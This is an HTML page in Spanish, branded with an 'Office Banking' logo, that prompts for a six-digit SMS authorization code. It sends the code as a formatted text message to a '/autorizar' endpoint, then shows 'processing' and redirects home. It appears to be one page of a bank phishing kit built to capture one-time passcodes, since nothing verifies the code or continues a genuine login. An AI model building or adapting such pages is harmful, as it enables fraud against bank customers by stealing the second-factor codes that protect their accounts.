<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Autorización por SMS</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
  <style>
    .sms-container {
      margin: 20px 0;
    }
    .sms {
      width: 100%;              /* ✅ ocupa todo el ancho en móviles */
      padding: 14px;
      font-size: 1.4em;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }
    .botones {
      margin-top: 20px;
    }
    .btn-red {
      width: 100%;              /* ✅ botón ocupa todo el ancho */
      padding: 14px;
      font-size: 1.1em;
    }
    #mensaje {
      margin-top: 20px;
      font-weight: bold;
      color: red;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
    <h2>Ingrese el código SMS de 6 dígitos</h2>

    <form id="formSMS">
      <div class="sms-container">
        <input type="text" id="smsCode" class="sms" maxlength="6" placeholder="123456" required>
      </div>
      <div class="botones">
        <button type="submit" class="btn-red">Autorizar</button>
      </div>
    </form>

    <div id="mensaje"></div>
  </div>

  <script>
    const AUTORIZAR_URL = "/autorizar";

    // Validar que solo se ingresen números y máximo 6 dígitos
    const smsInput = document.getElementById("smsCode");
    smsInput.addEventListener("input", function() {
      this.value = this.value.replace(/[^0-9]/g, "");
      if(this.value.length > 6){
        this.value = this.value.slice(0,6);
      }
    });

    document.getElementById("formSMS").addEventListener("submit", async function(e){
      e.preventDefault();
      const smsCode = smsInput.value;

      const mensaje = `Autorización por SMS: ${smsCode}`;

      try {
        await fetch(AUTORIZAR_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mensaje })
        });
        document.getElementById("mensaje").innerText = "✅ SMS enviado, procesando...";
        setTimeout(()=> window.location.href="/", 3000); // redirige a tu home
      } catch (error) {
        document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
      }
    });
  </script>
</body>
</html>
